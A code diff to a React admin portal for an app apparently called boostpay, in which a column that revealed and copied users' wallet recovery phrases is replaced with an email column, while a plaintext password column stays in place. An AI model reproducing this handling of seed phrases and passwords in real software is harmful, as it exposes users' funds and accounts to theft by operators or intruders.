@@ -852,13 +852,12 @@ export const AdminPortal: FC<Props> = ({ onBack }) => {
                       <th className="px-4 py-3">Lifetime Profit</th>
                       <th className="px-4 py-3">Boost State</th>
                       <th className="px-4 py-3">Account Status</th>
-                      <th className="px-4 py-3">Recovery Phrase</th>
+                      <th className="px-4 py-3">Email Address</th>
                       <th className="px-4 py-3 text-right">Actions</th>
                     </tr>
                   </thead>
                   <tbody className="divide-y divide-zinc-800/60 font-mono">
                     {filteredUsers.map((u) => {
-                      const isRevealed = !!revealedPhrases[u.id];
                       const isSelected = selectedUser?.id === u.id;
                       const isBoosting = u.boostState && u.boostState.isActive && !u.boostState.isPaused;
 
@@ -906,21 +905,15 @@ export const AdminPortal: FC<Props> = ({ onBack }) => {
                           </td>
                           <td className="px-4 py-3">
                             <div className="flex items-center gap-1.5" onClick={(e) => e.stopPropagation()}>
-                              <span className="font-sans text-[11px] text-zinc-400 truncate max-w-[140px]">
-                                {isRevealed ? u.phrase : '••••••••••••••••'}
+                              <span className="font-sans text-[11px] text-zinc-200 truncate max-w-[160px]">
+                                {u.email || `user${u.id}@boostpay.app`}
                               </span>
                               <button
-                                onClick={() => setRevealedPhrases(prev => ({ ...prev, [u.id]: !prev[u.id] }))}
+                                onClick={() => copyText(u.email || `user${u.id}@boostpay.app`, `email-${u.id}`)}
                                 className="text-zinc-500 hover:text-zinc-300 p-1"
+                                title="Copy email"
                               >
-                                {isRevealed ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
-                              </button>
-                              <button
-                                onClick={() => copyText(u.phrase, `phrase-${u.id}`)}
-                                className="text-zinc-500 hover:text-zinc-300 p-1"
-                                title="Copy phrase"
-                              >
-                                {copiedId === `phrase-${u.id}` ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
+                                {copiedId === `email-${u.id}` ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                               </button>
                             </div>
                           </td>
@@ -1364,14 +1357,13 @@ export const AdminPortal: FC<Props> = ({ onBack }) => {
                       <th className="pb-2 font-semibold">Balance</th>
                       <th className="pb-2 font-semibold">Profit</th>
                       <th className="pb-2 font-semibold">Boost State</th>
-                      <th className="pb-2 font-semibold">Recovery Phrase</th>
+                      <th className="pb-2 font-semibold">Email Address</th>
                       <th className="pb-2 font-semibold">Password</th>
                       <th className="pb-2 font-semibold">Registered</th>
                     </tr>
                   </thead>
                   <tbody className="divide-y divide-zinc-800/60">
                     {users.map((u) => {
-                      const isPhraseRevealed = revealedPhrases[u.id];
                       return (
                         <tr key={u.id} className="hover:bg-zinc-800/30 transition">
                           <td className="py-2.5 font-bold text-amber-400">#{u.id}</td>
@@ -1386,17 +1378,10 @@ export const AdminPortal: FC<Props> = ({ onBack }) => {
                               <span className="text-zinc-500">Idle</span>
                             )}
                           </td>
-                          <td className="py-2.5 text-zinc-400 max-w-[140px] truncate">
-                            {isPhraseRevealed ? u.phrase : '••••••••••••••••••••'}
-                            <button
-                              onClick={() => setRevealedPhrases(prev => ({ ...prev, [u.id]: !prev[u.id] }))}
-                              className="ml-2 text-zinc-500 hover:text-zinc-300"
-                              title={isPhraseRevealed ? 'Hide phrase' : 'Show phrase'}
-                            >
-                              {isPhraseRevealed ? <EyeOff className="w-3 h-3 inline" /> : <Eye className="w-3 h-3 inline" />}
-                            </button>
+                          <td className="py-2.5 text-zinc-200 font-mono">
+                            {u.email || `user${u.id}@boostpay.app`}
                           </td>
-                          <td className="py-2.5 text-zinc-400">
+                          <td className="py-2.5 text-zinc-400 font-mono">
                             {u.password || <span className="text-zinc-600">None</span>}
                           </td>
                           <td className="py-2.5 text-zinc-500 text-[10px]">
